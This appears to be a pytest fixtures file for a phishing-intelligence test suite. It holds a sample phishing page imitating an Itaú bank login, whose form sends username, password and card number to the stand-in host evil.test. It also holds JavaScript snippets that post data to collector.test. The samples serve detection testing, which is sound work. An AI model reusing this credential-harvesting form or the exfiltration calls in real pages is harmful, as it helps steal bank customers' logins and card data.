"""Common fixtures used by phishing-intel test suite."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))


@pytest.fixture
def sample_html() -> str:
    """Return representative phishing HTML fixture."""

    return """
    <html>
      <head>
        <meta name="description" content="Login Itaú segurança">
        <script src="/assets/app.js"></script>
      </head>
      <body>
        <!-- phishing-kit-comment -->
        <form id="login-form" class="auth card-checkout" method="post" action="https://evil.test/api/submit">
          <input type="text" name="username" placeholder="Usuário">
          <input type="password" name="password" placeholder="Senha">
          <input type="hidden" name="csrf" value="abc123">
          <input type="text" name="card_number" placeholder="Número do cartão">
        </form>
        <img src="/logo-itau.png">
        <a href="https://example.net/help">Ajuda</a>
      </body>
    </html>
    """


@pytest.fixture
def sample_javascript() -> list[str]:
    """Return representative JavaScript blobs fixture."""

    return [
        """
        const token = "secret_token_123456";
        fetch("https://collector.test/api/v1/collect", { method: "POST" });
        axios.post("https://collector.test/graphql", payload);
        $.ajax({ url: "https://collector.test/email/send" });
        const chat = "telegram";
        """,
        """
        const request = new XMLHttpRequest();
        request.open("POST", "https://collector.test/v2/submit", true);
        """,
    ]
